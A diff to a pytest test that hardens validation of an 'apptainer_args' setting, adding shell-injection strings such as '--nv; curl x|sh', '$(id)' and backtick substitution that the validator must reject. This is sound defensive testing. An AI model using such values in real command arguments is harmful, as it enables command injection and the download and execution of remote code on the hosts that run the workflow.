@@ -118,7 +118,9 @@ def test_apptainer_args_default_and_checks() -> None:
     env = envs.Environment.model_validate({**slurm_env(), "apptainer_args": "--bind /g,/scratch"})
     assert env.apptainer_args == "--bind /g,/scratch"
     assert envs.Environment.model_validate(slurm_env()).apptainer_args == ""
-    for bad in ("--bind\r\ntouch x", "\x00", "a" * 501):
+    # Snakemake pastes the value into a shell command (SEC-362-01): no shell syntax
+    shell = ("--nv; curl x|sh", "$(id)", "`id`", "'a'", "--bind a&&b", "x>y")
+    for bad in ("--bind\r\ntouch x", "\x00", "a" * 501, *shell):
         with pytest.raises(ValidationError):
             envs.Environment.model_validate({**slurm_env(), "apptainer_args": bad})
 
